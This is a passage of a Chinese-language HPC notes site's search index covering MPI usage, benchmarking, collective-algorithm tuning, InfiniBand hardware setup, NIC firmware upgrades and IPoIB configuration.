\u7684\u5305\u88c5\u3002\u5176\u9009\u9879\u6709\u5168\u5c40\u9009\u9879\u548c\u5c40\u90e8\u9009\u9879\u4e4b\u5206\uff0c\u4e00\u822c\u4ee5 <code>g</code> \u5f00\u5934\u7684\u53c2\u6570\u662f\u5168\u5c40\u9009\u9879\uff0c\u4e0b\u6587\u4e0d\u5bf9\u5168\u5c40\u548c\u5c40\u90e8\u9009\u9879\u5206\u522b\u4ecb\u7ecd\u3002</p> <p>\u53ef\u4ee5\u7f16\u5199\u6587\u4ef6\u4fdd\u5b58\u9009\u9879\uff0c\u4f7f\u7528 <code>-configfile</code> \u6307\u5b9a\u914d\u7f6e\u6587\u4ef6\uff0c<code>#</code> \u6ce8\u91ca\u3002<code>./mpiexec.conf</code> \u4f1a\u81ea\u52a8\u52a0\u8f7d\u3002</p> <ul> <li>\u73af\u5883\u53d8\u91cf<ul> <li><code>-genv &lt;ENVVAR&gt; &lt;val&gt;</code> \u6307\u5b9a\u8fd0\u884c\u65f6\u73af\u5883\u53d8\u91cf\uff0c\u5e38\u7528\u7684\u6709\uff1a<code>OMP_</code></li> <li><code>-genvall, -genvnone</code> \u63a7\u5236\u662f\u5426\u4f20\u9012\u73af\u5883\u53d8\u91cf</li> </ul> </li> <li>profiling:<ul> <li><code>-trace</code> <code>-aps</code> <code>-mps</code></li> </ul> </li> <li>\u8bbe\u5907\uff1a<ul> <li><code>-iface</code></li> </ul> </li> <li>\u8fd0\u884c\u53c2\u6570\uff1a<ul> <li><code>-n, -np</code> \u8fdb\u7a0b\u6570</li> <li><code>-env</code> \u73af\u5883\u53d8\u91cf</li> <li><code>-path</code> \u53ef\u6267\u884c\u6587\u4ef6</li> </ul> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#oneapi-benchmarks","title":"oneAPI Benchmarks","text":"<p>Quote</p> <ul> <li>Intel MPI Benchmarks User Guide</li> <li> intel/mpi-benchmarks</li> </ul> <p>Intel\u00ae MPI Benchmarks \u5305\u542b\u4ee5\u4e0b\u7ec4\u4ef6\uff1a</p> <ul> <li>IMB-MPI1 \u2013 \u7528\u4e8e MPI-1 \u529f\u80fd\u7684\u57fa\u51c6\u6d4b\u8bd5\u3002</li> <li>\u7528\u4e8e MPI-2 \u529f\u80fd\u7684\u7ec4\u4ef6\uff1a<ul> <li>IMB-EXT \u2013 \u5355\u8fb9\u901a\u4fe1\u57fa\u51c6\u6d4b\u8bd5\u3002</li> <li>IMB-IO \u2013 \u8f93\u5165/\u8f93\u51fa\u57fa\u51c6\u6d4b\u8bd5\u3002</li> </ul> </li> <li>\u7528\u4e8e MPI-3 \u529f\u80fd\u7684\u7ec4\u4ef6\uff1a<ul> <li>IMB-NBC \u2013 \u975e\u963b\u585e\u96c6\u5408\uff08non-blocking collective\uff0cNBC\uff09 \u64cd\u4f5c\u7684\u57fa\u51c6\u6d4b\u8bd5\u3002</li> <li>IMB-RMA \u2013 \u5355\u8fb9\u901a\u4fe1\u57fa\u51c6\u6d4b\u8bd5\u3002\u8fd9\u4e9b\u57fa\u51c6\u6d4b\u8bd5\u6d4b\u91cf MPI-3 \u6807\u51c6\u4e2d\u5f15\u5165\u7684\u8fdc\u7a0b\u5185\u5b58\u8bbf\u95ee\uff08Remote Memory Access\uff0cRMA\uff09 \u529f\u80fd\u3002</li> <li>IMB-MT \u2013 \u5728\u6bcf\u4e2a rank \u5185\u8fd0\u884c\u7684\u591a\u7ebf\u7a0b \u7684 MPI-1 \u529f\u80fd\u57fa\u51c6\u6d4b\u8bd5\u3002</li> </ul> </li> </ul> <p>\u4f7f\u7528\u65b9\u6cd5\u89c1\uff1a</p> <ul> <li>Intel(R) MPI Benchmarks User Guide</li> <li>Command-line Control</li> </ul> <p>\u4e00\u4e2a\u7b80\u5355\u7684\u4f8b\u5b50</p> <pre><code>mpirun -ppn 1 -f hostfile IMB-MPI1 &gt; MPI1.log\n</code></pre> <p>\u8981\u83b7\u53d6\u66f4\u591a\u8c03\u8bd5\u4fe1\u606f\uff0c\u8bf7\u5728\u8fd0\u884c\u524d\u8bbe\u7f6e <code>I_MPI_DEBUG</code>\uff08\u53ef\u4ee5\u8bbe\u7f6e\u4e3a <code>0</code> \u5230 <code>5</code>\uff09\u3002</p> <pre><code>I_MPI_DEBUG=1 mpirun -ppn 1 -f hostfile IMB-MPI1 &gt; MPI1.log\n</code></pre> <p>\u4e0b\u9762\u7684\u547d\u4ee4\u884c\u5728\u57fa\u51c6\u6d4b\u8bd5\u5217\u8868 <code>IMB-MPI1</code> \u4e2d\u53ea\u6267\u884c <code>PingPong</code> \u57fa\u51c6\u6d4b\u8bd5\u3002</p> <pre><code>mpirun -ppn 1 -f hostfile IMB-MPI1 PingPong\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#oneapi-\u8fd0\u884c\u53c2\u6570","title":"oneAPI \u8fd0\u884c\u53c2\u6570","text":"<p>Quote</p> <ul> <li>Intel\u00ae MPI Library 2019 Over Libfabric*</li> <li>Improve Performance and Stability with Intel\u00ae MPI Library on InfiniBand*</li> </ul> <p></p> <p>\u542f\u7528 Infiniband \u53ea\u9700\u9009\u62e9 <code>libfabric</code> \u63d0\u4f9b\u8005\u4e3a <code>mlx</code>\u3002\u9ed8\u8ba4\u7684 <code>libfabric</code> \u63d0\u4f9b\u8005\u662f <code>mlx</code>\u3002\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u8fdb\u884c\u68c0\u67e5\uff1a</p> <pre><code>$ I_MPI_DEBUG=1 mpirun -n 1 IMB-MPI1 barrier | grep 'libfabric provider'\n[0] MPI startup(): libfabric provider: mlx\n</code></pre> <p>\u5982\u679c\u4e0d\u662f\uff0c\u8bf7\u663e\u5f0f\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>export FI_PROVIDER=mlx\n</code></pre> <p>\u6216</p> <pre><code>export I_MPI_OFI_PROVIDER=mlx\n</code></pre> <p>\u6ce8\u610f\uff1a <code>I_MPI_OFI_PROVIDER</code> \u4f18\u5148\u4e8e <code>FI_PROVIDER</code>\u3002</p> <p>\u57fa\u51c6\u6d4b\u8bd5</p> <pre><code>mpirun -ppn 48 -f hostfile IMB-RMA All_get_all -msglog 16:23 -npmin 32 -time 50 -iter_policy dynamic\n</code></pre> <pre><code>Device        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4495.28      2278.12      4287.79      2186.83\n\nDevice        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4514.77      2292.04      4355.75      2204.24\n\nDevice        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4678.16      2360.21      4487.70      2250.06\n\nDevice        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4585.16      2294.27      4359.95      2241.65\n\nDevice        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4521.93      2314.73      4397.54      2197.37\n\nDevice        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4571.10      2291.09      4350.33      2215.72\n\nDevice        recv_MBps    recv_kpps    xmit_MBps    xmit_kpps\nmlx4_0          4572.34      2336.06      4433.98      2243.59\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#oneapi-\u8c03\u8bd5","title":"oneAPI \u8c03\u8bd5","text":"<pre><code>mpirun -n 4 -gtool \"gdb-oneapi:0-3=attach\" ./wrf_hydro.exe\n# Using 'z' command you can switch active processes.\n# e.g.\n# 0-3: (gdb) z 1-3\n# 1-3: (gdb) b 53\n# 1-3: Breakpoint 2 at 0x4009f3: file test.c, line 53.\n# 1-3: (gdb) z\n# 0-3: (gdb) r\n# 0-3: Continuing.\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#hpc-x","title":"HPC-X","text":"<p>Quote</p> <ul> <li>Get Started with HPC-X - HPC-Works - Confluence</li> <li>HPC-X 2.0 Boosts Performance of Grid Benchmark - HPC-Works - Confluence</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#hpc-x-\u4f7f\u7528","title":"HPC-X \u4f7f\u7528","text":"<p>Quote</p> <ul> <li>HPC-X Environments - NVIDIA</li> <li>MPI \u5e76\u884c\u7a0b\u5e8f\u7f16\u8bd1\u53ca\u8fd0\u884c \u2014 \u4e2d\u56fd\u79d1\u5927\u8d85\u7ea7\u8ba1\u7b97\u4e2d\u5fc3\u7528\u6237\u4f7f\u7528\u624b\u518c\uff1a2024-05-18 \u7248 \u6587\u6863\uff1a\u6709\u5f88\u591a mpi \u53c2\u6570\u53ef\u4ee5\u53c2\u8003\uff0c\u5305\u62ec ucx hcoll sharp \u53c2\u6570</li> </ul> <p>\u4ece 2.1 \u7248\u672c\u5f00\u59cb\uff0cHPC-X \u5de5\u5177\u5305\u63d0\u4f9b\u4e86\u4e00\u7ec4\u73af\u5883\uff08Environments\uff09\uff1a</p> <ul> <li> <p>\u652f\u6301 CUDA\u00ae \u7684 HPC-X - <code>hpcx</code></p> <p>\u9ed8\u8ba4\u9009\u9879\uff0c\u9488\u5bf9\u5355\u7ebf\u7a0b\u6a21\u5f0f\u8fdb\u884c\u4e86\u6700\u4f73\u6027\u80fd\u4f18\u5316\uff0c\u652f\u6301 GPU \u548c\u975e GPU \u8bbe\u7f6e\u3002</p> </li> <li> <p>\u652f\u6301\u591a\u7ebf\u7a0b\u7684 HPC-X - <code>hpcx-mt</code></p> <p>\u7528\u4e8e\u591a\u7ebf\u7a0b MPI \u7a0b\u5e8f\u3002</p> </li> <li> <p>\u7528\u4e8e\u5206\u6790\u7684 HPC-X - <code>hpcx-prof</code></p> <p>\u542f\u7528\u7f16\u8bd1\u4e86 Profile \u4fe1\u606f\u7684 UCX\u3002</p> </li> <li> <p>\u7528\u4e8e\u8c03\u8bd5\u7684 HPC-X - hpcx-debug</p> <p>\u542f\u7528\u4ee5\u8c03\u8bd5\u6a21\u5f0f\u7f16\u8bd1\u7684 UCX/HCOLL/SHARP\u3002</p> </li> <li> <p>HPC-X \u5806\u6808 - hpcx-stack</p> <p>\u5305\u542b\u9664\u4e86 OMPI \u4e4b\u5916\u7684\u6240\u6709\u5e93\u3002</p> </li> </ul> <p>\u76f8\u5173\u914d\u7f6e\u68c0\u67e5\uff1a\u68c0\u67e5\u652f\u6301\u7684\u4f20\u8f93\u65b9\u5f0f\uff0cRDMA \u5e94\u8be5\u652f\u6301 rc, dc, ud \u65b9\u5f0f\uff0c\u4f7f\u7528 <code>UCX_TLS=rc, ud, sm, self</code> \u8bbe\u7f6e\u4f7f\u7528\u7684\u4f20\u8f93\u65b9\u5f0f</p> <pre><code>$ ucx_info -d | grep Transport\n      Transport: self\n      Transport: tcp\n      Transport: tcp\n      Transport: tcp\n      Transport: sysv\n      Transport: posix\n      Transport: dc_mlx5\n      Transport: rc_verbs\n      Transport: rc_mlx5\n      Transport: ud_verbs\n      Transport: ud_mlx5\n      Transport: cma\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#mpi-\u6807\u51c6","title":"MPI \u6807\u51c6","text":"<p>MPI \u6807\u51c6\u5b58\u6863\u4e8e MPI Forum\u3002\u672c\u7bc7\u7b14\u8bb0\u57fa\u4e8e MPI-3.0 \u6807\u51c6\uff0c\u9009\u62e9\u5b83\u7684\u539f\u56e0\u6709\uff1a</p> <ul> <li>MPI-3.0 \u53d1\u5e03\u4e8e 2012 \u5e74\u3002\u5230\u76ee\u524d\uff0c\u5e38\u7528\u7684 MPI \u5b9e\u73b0\u5982 Intel MPI\u3001Nvidia HPC-X\u3001MPICH \u5747\u4e8e 2021 \u5e74\u5de6\u53f3\u5b8c\u6210\u4e86\u5bf9 MPI-3.0 \u7684\u5b8c\u5584\u7684\u652f\u6301\u3002</li> <li>MPI-3.0 \u6807\u51c6\u662f\u5bf9 MPI \u7684\u91cd\u5927\u66f4\u65b0\uff0c\u6dfb\u52a0\u4e86\u96c6\u5408\u901a\u4fe1\u7684\u975e\u963b\u585e\u7248\u672c\u7b49\u5185\u5bb9\u3002</li> <li>MPI-3.0 \u6807\u51c6\u6bd4\u524d\u4e24\u7248\u5b8c\u5584\uff0c\u63d0\u4f9b\u4e86\u4e0d\u5c11\u793a\u4f8b\u4ee3\u7801\u4f5c\u4e3a\u53c2\u8003\uff0c\u9002\u5408\u5b66\u4e60\u3002</li> </ul> \u5982\u4f55\u67e5\u770b\u5f53\u524d\u73af\u5883\u652f\u6301\u7684 MPI \u7248\u672c <ul> <li>\u4f7f\u7528 <code>mpirun --version</code> \u53ef\u4ee5\u67e5\u770b\u5f53\u524d\u73af\u5883\u7684\u7248\u672c\uff0c\u518d\u53bb\u67e5\u9605\u5bf9\u5e94\u7248\u672c\u6587\u6863\u627e\u5230\u652f\u6301\u7684\u6807\u51c6\u7248\u672c\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#mpi-\u9ad8\u7ea7\u8bdd\u9898","title":"MPI \u9ad8\u7ea7\u8bdd\u9898","text":"","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u901a\u4fe1\u7b97\u6cd5\u8c03\u4f18","title":"\u901a\u4fe1\u7b97\u6cd5\u8c03\u4f18","text":"<p>MPI \u5b9e\u73b0\u4e00\u822c\u90fd\u4f1a\u4e3a\u96c6\u5408\u901a\u4fe1\u63d0\u4f9b\u4e0d\u540c\u7684\u7b97\u6cd5\uff0c\u4ee5\u9002\u5e94\u4e0d\u540c\u7684\u901a\u4fe1\u6a21\u5f0f\u3002\u8fd9\u4e9b\u7b97\u6cd5\u5728\u7279\u5b9a\u573a\u666f\u4e0b\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\u7684\u6027\u80fd\u8868\u73b0\uff0c\u56e0\u6b64\u9700\u8981\u6839\u636e\u5b9e\u9645\u60c5\u51b5\u8fdb\u884c\u8c03\u4f18\u3002</p> <p>\u4e00\u7bc7\u7ecf\u5178\u7684\u4f8b\u5b50\u662f\uff1aGitHub: OpenMPI Bcast and Allreduce much slower than Intel-MPI (unrelated to EFA)\u3002\u8fd9\u4f4d\u4f5c\u8005\u5728 AWS \u96c6\u7fa4\u4e0a\u6d4b\u8bd5\u4e86 OpenMPI \u548c IntelMPI \u5404\u79cd\u7b97\u6cd5\u7684\u6027\u80fd\uff0c\u7ed9\u51fa\u4e86\u8be6\u7ec6\u7684\u6d4b\u8bd5\u7ed3\u679c\u3002</p> <p></p> <p>\u53ef\u4ee5\u770b\u51fa\u6027\u80fd\u5dee\u8ddd\u8fd8\u662f\u6bd4\u8f83\u660e\u663e\u7684\uff0c\u56e0\u6b64\u7b97\u6cd5\u8c03\u4f18\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002</p> OpenMPIIntel MPI <ul> <li>\u5217\u51fa\u53ef\u7528\u7684\u96c6\u5408\u901a\u4fe1\u7b97\u6cd5\uff1a</li> </ul> <pre><code>ompi_info --param coll tuned --level 9\nMCA coll tuned: parameter \"coll_tuned_allreduce_algorithm\" (current\n                          value: \"ignore\", data source: default, level: 5\n                          tuner/detail, type: int)\n                          Which allreduce algorithm is used. Can be locked\n                          down to any of: 0 ignore, 1 basic linear, 2\n                          nonoverlapping (tuned reduce + tuned bcast), 3\n                          recursive doubling, 4 ring, 5 segmented ring. Only\n                          relevant if coll_tuned_use_dynamic_rules is true.\n                          Valid values: 0:\"ignore\", 1:\"basic_linear\",\n                          2:\"nonoverlapping\", 3:\"recursive_doubling\",\n                          4:\"ring\", 5:\"segmented_ring\", 6:\"rabenseifner\"\n</code></pre> <ul> <li>\u901a\u8fc7 MCA \u53c2\u6570\u8bbe\u7f6e\u7b97\u6cd5\uff0c\u4ee5 recursive doubling \u4e3a\u4f8b\uff1a</li> </ul> <pre><code>--mca coll_tuned_use_dynamic_rules 1 \\\n--mca coll_tuned_allreduce_algorithm 3 \\\n--mca coll_tuned_allreduce_algorithm_segmentsize 4096 \\\n--mca coll_tuned_allreduce_algorithm_tree_fanout 4\n</code></pre> <ul> <li>\u8bbe\u7f6e Bcast \u7b97\u6cd5\uff1a</li> </ul> <pre><code>orterun \\\n--mca coll_tuned_use_dynamic_rules 1 \\\n--mca coll_tuned_bcast_algorithm $algo \\\n</code></pre>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#sharp","title":"SHArP","text":"<p>Quote</p> <ul> <li>SHArP: Scalable Hierarchical Agglomerative Reduction Protocol\uff1a\u539f\u59cb\u8bba\u6587</li> <li>SHARP: IN-NETWORK SCALABLE STREAMING HIERARCHICAL AGGREGATION AND REDUCTION PROTOCOL\uff1aNV \u7684\u4e00\u6b21\u8bb2\u5ea7\u3002</li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u786c\u4ef6\u51c6\u5907\u5de5\u4f5c","title":"\u786c\u4ef6\u51c6\u5907\u5de5\u4f5c","text":"<p>IB \u76f8\u5173\u7684\u786c\u4ef6\u4e3b\u8981\u4e5f\u65e0\u975e\u662f\u4e09\u5757\uff1aCX \u7f51\u5361\u3001\u7f51\u7ebf\u3001IB \u4ea4\u6362\u673a\u3002\u4f46\u662f\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\uff0c\u5373\u4f7f\u7f51\u5361\u3001\u7f51\u7ebf\u3001\u4ea4\u6362\u673a\u6709\u7740\u770b\u4e0a\u53bb\u4e00\u6a21\u4e00\u6837\u7684\u7f51\u5361\u63a5\u53e3\uff0c\u4f46\u662f CX \u7f51\u5361\u548c IB \u4ea4\u6362\u673a\u5bf9\u7f51\u7ebf\u7684\u901f\u7387\u662f\u5b58\u5728\u8981\u6c42\u7684\uff01\uff01\u5177\u4f53\u800c\u8a00\uff1a</p> <ul> <li>IB \u4ea4\u6362\u673a\u53ef\u4ee5\u5411\u4e0b\u517c\u5bb9\u7f51\u7ebf\uff0c\u4f46\u65e0\u6cd5\u5411\u4e0a\u517c\u5bb9\u3002\u4f8b\u5982\uff0c100 Gb \u7684\u4ea4\u6362\u673a\u65e0\u6cd5\u63a5\u5165 200 Gb \u7684\u7f51\u7ebf\uff0c\u4f46 200 Gb \u7684\u4ea4\u6362\u673a\u53ef\u4ee5\u63a5\u5165 100 Gb \u7684\u7f51\u7ebf\u3002</li> <li> <p>CX \u7f51\u5361\u548c\u7f51\u7ebf\u5fc5\u987b\u5b8c\u5168\u5bf9\u5e94\uff01\u4f8b\u5982\uff0c1\u00d7100 Gb \u7684 CX-5 \u548c 1\u00d7100 Gb \u7684 CX-6 \u90fd\u53ea\u80fd\u8fde 100 Gb \u7684\u7f51\u7ebf\u3002</p> <p>\u8fde\u7ebf\u4e4b\u540e\uff0c\u53ef\u4ee5\u901a\u8fc7 <code>ibstat</code> \u547d\u4ee4\u67e5\u770b\u3002\u5982\u679c Physical state \u663e\u793a polling\uff08Rate \u663e\u793a\u901a\u5e38\u4e5f\u662f 10 \u6216\u8005 25\uff09\uff0c\u5219\u9700\u8981\u6000\u7591\u662f\u4e0d\u662f\u7f51\u7ebf\u548c\u7f51\u5361\u4e0d\u5bf9\u5e94\u4e86\u3002</p> <pre><code>$ ibstat\nCA 'mlx5_0'\n    CA type: MT4115\n    Number of ports: 1\n    Firmware version: 16.27.1000\n    Hardware version: 0\n    Node GUID: 0x0002c90300a0b1c0\n    System image GUID: 0x0002c90300a0b1c3\n    Port 1:\n        State: Active\n        Physical state: Polling\n</code></pre> <p>\u53e6\u5916\u6709\u4e00\u4e2a\u7384\u5b66\u7684\u60c5\u51b5\u662f\uff0c\u6211\u4eec\u5b9e\u9a8c\u65f6 2\u00d7100 Gb \u7f51\u5361\u8981\u6c42\u7684\u662f 200 Gb \u7684\u7f51\u7ebf\uff0c100 Gb \u7f51\u7ebf\u5219\u4e0d\u53ef\u7528\u3002\u4e0d\u6e05\u695a\u8fd9\u4e2a\u5bf9\u5e94\u5173\u7cfb\u662f\u600e\u6837\u7684\u3002</p> </li> </ul> <p>\u6b64\u5916\uff0c\u53cc\u53e3\u7f51\u5361\u4f18\u5148\u63d2 1 \u53e3\u540e\u63d2 2 \u53e3\uff0c\u4e0d\u7136\u6709\u65f6\u4e5f\u8bc6\u522b\u4e0d\u5230\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#cx-\u7f51\u5361\u5207\u6362-infinibandethernet-\u5f62\u5f0f","title":"CX \u7f51\u5361\u5207\u6362 Infiniband/Ethernet \u5f62\u5f0f","text":"<p>\u5927\u81f4\u6d41\u7a0b\uff1a</p> <ol> <li> <p>\u901a\u8fc7 <code>ibstat</code> \u770b\u5230\u7f51\u5361\u7684 CA Type\uff1b</p> <pre><code>$ ibstat\nCA 'mlx5_0'\n    CA type: MT4115\n</code></pre> </li> <li> <p>\u901a\u8fc7 <code>mst start</code> \u6fc0\u6d3b mst \u9a71\u52a8\uff0c\u5e76\u4e14\u901a\u8fc7 CA Type \u6570\u503c\u5728 <code>/dev/mst/</code> \u4e2d\u627e\u5230\u7f51\u5361\uff1b</p> <pre><code>$ sudo mst start\n...\n$ ls /dev/mst/\nmt4115_pciconf0\n</code></pre> </li> <li> <p>\u901a\u8fc7 <code>mlxconfig</code> \u627e\u5230\u8bbe\u7f6e\u7f51\u5361 <code>LINK_TYPE</code> \u5bc4\u5b58\u5668\u3002\u6ce8\u610f\u5bf9\u591a\u7f51\u53e3\u7f51\u5361\u9700\u8981\u8bbe\u7f6e\u7f51\u53e3\u7f16\u53f7\uff1b\u800c <code>LINK_TYPE</code> \u4e2d <code>1</code> \u4ee3\u8868 IB\uff0c<code>2</code> \u4ee3\u8868\u4ee5\u592a\u7f51\u3002</p> <pre><code>sudo mlxconfig -d /dev/mst/mt4115_pciconf0 set LINK_TYPE_P1=2\n</code></pre> </li> <li> <p>\u91cd\u542f\u4f7f\u5f97\u914d\u7f6e\u751f\u6548\u3002</p> </li> </ol>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u4f7f\u7528-sharp-\u7684\u51c6\u5907\u5de5\u4f5c","title":"\u4f7f\u7528 SHARP \u7684\u51c6\u5907\u5de5\u4f5c","text":"<p>Quote</p> <ul> <li>NVIDIA Scalable Hierarchical Aggregation and Reduction Protocol (SHARP) Rev 3.6.0 - NVIDIA Docs</li> </ul> <ul> <li>\u4e00\u53f0 IB \u4ea4\u6362\u673a\u3002</li> <li>\u82e5\u5e72 CX-6 \u53ca\u4ee5\u4e0a\u7684\u7f51\u5361\u3002\\(N\\) \u4e2a\u8ba1\u7b97\u8282\u70b9\u9700\u8981\u6709 \\(N+1\\) \u5f20\u7f51\u5361\uff08\u4e00\u4e2a\u7528\u4e8e\u805a\u5408\u7ba1\u7406\u8005 AM\uff09\u3002\u6211\u4eec\u6682\u65f6\u6ca1\u9a8c\u8bc1\u8fc7 BF \u7684\u53ef\u7528\u6027\u548c\u914d\u7f6e\u6d41\u7a0b\u3002</li> <li>\u5bf9\u5e94\u7684\u7f51\u7ebf\u3002</li> </ul> <p>\u6ce8\u610f\uff1a\u4ea4\u6362\u673a\u548c\u7f51\u5361\u7684\u56fa\u4ef6\u6700\u4f4e\u7248\u672c\u5fc5\u987b\u6ee1\u8db3 NVIDIA \u6587\u6863\u4e2d\u7684\u8981\u6c42\u3002\u4f8b\u5982\u5bf9 SHARP v3.6.0\uff0c\u56fa\u4ef6\u8981\u6c42\u5982\u53c2\u8003\u94fe\u63a5\u6587\u6863\u4e2d\u6240\u793a\u3002\u7f51\u5361\u95f4\u56fa\u4ef6\u7248\u672c\u5728\u6ee1\u8db3\u8981\u6c42\u7684\u524d\u63d0\u4e0b\u53ef\u4ee5\u6709\u5c0f\u5dee\u8ddd\uff0c\u65e0\u9700\u5b8c\u5168\u5bf9\u9f50\u3002</p>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#\u5347\u7ea7\u56fa\u4ef6\u7684\u65b9\u6cd5","title":"\u5347\u7ea7\u56fa\u4ef6\u7684\u65b9\u6cd5","text":"<ul> <li> <p>IB \u4ea4\u6362\u673a\uff1a\u4ece\u5b98\u7f51\uff08https://network.nvidia.com/support/firmware/firmware-downloads/\uff09\u4e0b\u8f7d\u56fa\u4ef6\uff08<code>.zip</code> \u6216\u8005 <code>.tgz</code> \u683c\u5f0f\uff0c\u91cc\u9762\u6709\u4e00\u4e2a <code>.bin</code> \u6587\u4ef6\uff09\uff0c\u901a\u8fc7 <code>sudo mst ib add</code> \u626b\u63cf IB \u7f51\u7edc\u4e0a\u7684\u6240\u6709\u8bbe\u5907\uff08\u6b64\u65f6 <code>/dev/mst</code> \u4e0b\u4f1a\u51fa\u73b0 <code>SW_MTXXXXX_Quantum</code> \u5f00\u5934\u7684\u8bbe\u5907\uff09\uff0c\u4e4b\u540e\u901a\u8fc7 <code>flint burn</code> \u6307\u4ee4\u5c06\u56fa\u4ef6\u66f4\u65b0\u5230\u4ea4\u6362\u673a\u4e0a\u3002</p> <pre><code>sudo flint -d /dev/mst/SW_MT54000_Quantum_Mellanox_Technologies_lid-0x0002 -i ./fw-Quantum-rel-27_2012_4036-MQM8790-HS2X_Ax.bin burn\n</code></pre> </li> <li> <p>Mellanox \u5b98\u65b9\u7f51\u5361\uff08<code>psid</code> \u4ee5 <code>MT_</code> \u5f00\u5934\uff09\uff1a\u901a\u8fc7\u5b98\u65b9\u7684 <code>mlnxofedinstall</code> \u66f4\u65b0\u56fa\u4ef6\u3002\u6ce8\u610f\u4ec5\u9002\u7528\u4e8e\u5b98\u65b9\u5361\uff0c\u4e0d\u5305\u62ec\u7b2c\u4e09\u65b9\u5361\uff08\u7b2c\u4e09\u65b9\u5361\u7528\u8fd9\u79cd\u65b9\u6cd5\u66f4\u65b0\u4f1a\u62a5\u9519\uff09</p> <pre><code>sudo ./mlnxofedinstall --fw-update-only --force-fw-update\n</code></pre> </li> <li> <p>\u7b2c\u4e09\u65b9\u7f51\u5361\uff08<code>psid</code> \u4e0d\u4ee5 <code>MT_</code> \u5f00\u5934\uff09\uff1a\u901a\u8fc7\u7f51\u5361\u4f9b\u5e94\u65b9\u5b98\u7f51\u4e0b\u8f7d\u56fa\u4ef6\uff0c\u901a\u8fc7 <code>flint burn</code> \u66f4\u65b0\u7f51\u5361\u56fa\u4ef6\u3002</p> <pre><code>sudo flint -d /dev/mst/mt4123_pciconf0 -i ./fw-ConnectX6-rel-20_40_1000-P06154-B21_Ax-UEFI-14.33.10-FlexBoot-3.7.300.signed.bin burn\n</code></pre> </li> </ul>","tags":["\u4e0d\u5b8c\u5584"]},{"location":"optimization/parallel/cpu/mpi/#ipoib-\u914d\u7f6e","title":"IPoIB \u914d\u7f6e","text":"<p>Quote</p> <ul> <li>IP over InfiniBand (IPoIB) - NVIDIA Docs</li> </ul> <p>\u5982\u679c\u9700\u8981\u4f7f\u7528\u4e00\u4e9b IP \u76f8\u5173\u529f\u80fd\uff08e.g., PyTorch DDP \u9700\u8981\u914d\u7f6e IP\uff09\u7684\u8bdd\uff0c\u52a1\u5fc5\u542f\u7528 IPoIB\u3002</p> <p>\u542f\u7528\u65b9\u6cd5\u6709\u4e24\u79cd\uff0c\u9009\u4e00\u5373\u53ef\uff1a</p> <ul> <li> <p>\u91cd\u88c5 OFED\uff0c\u5728\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u52a0\u5165 IP \u76f8\u5173\u914d\u7f6e\uff0c\u8fd9\u6837\u673a\u5668\u542f\u52a8\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u542f\u7528 IPoIB \u7684\u76f8\u5173\u9a71\u52a8\uff08\u54ea\u6015\u5b9e\u9645\u914d\u4e0d\u8d77\u6765\uff0c\u4f8b\u5982\u8fd9\u91cc\u7684 <code>ib0</code> \u5e76\u4e0d\u5bf9\uff09</p> <pre><code># Static settings; all values provided by this file\nIPADDR_ib0=10.1.0.1\nNETMASK_ib0=255.255.0.0\nNETWORK_ib0=10.1.0.0\nBROADCAST_ib0=10.1.255.255\nONBOOT_ib0=1\n</code></pre> </li> <li> <p>\u670d\u52a1\u5668\u542f\u52a8\u540e\uff0c\u901a\u8fc7 <code>modprobe ib_ipoib</code> \u6302\u8f7d IPoIB \u9a71\u52a8\u3002</p> </li> </ul> <p>\u914d\u7f6e\u6210\u529f\u540e\uff0c\u5e94\u5f53\u5728 <code>/sys/class/net</code> \u4e2d\u770b\u5230\u5bf9\u5e94\u7684\u7f51\u5361\uff0c\u5982 <code>ibpXXs0</code> \uff08\u5355\u53e3\uff09\u6216\u8005 <code>ibpXXs0f0</code> \uff08\u53cc\u53e3\uff09\u7b49\u3002\u901a\u8fc7 <code>ifconfig</code> \u914d\u7f6e IP \u5373\u53ef\u3002\u4f8b\u5982\uff1a</p> <pre><code>sudo ifconfig ibp30s0f0 10.1.0.6/24\n</code></pre> <p>\u4e4b\u540e\uff0c\u901a\u8fc7 <code>ifconfig</code> \u5e94\u5f53\u53ef\u4ee5\u770b\u5230\u7f51\u5361\u914d\u7f6e IP \u4e14\u4e3a running \u72b6\u6001\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7 <code>ibping</code> \u548c <code>ping</code> \u7b49\u547d\u4ee4 <code>ping</code> 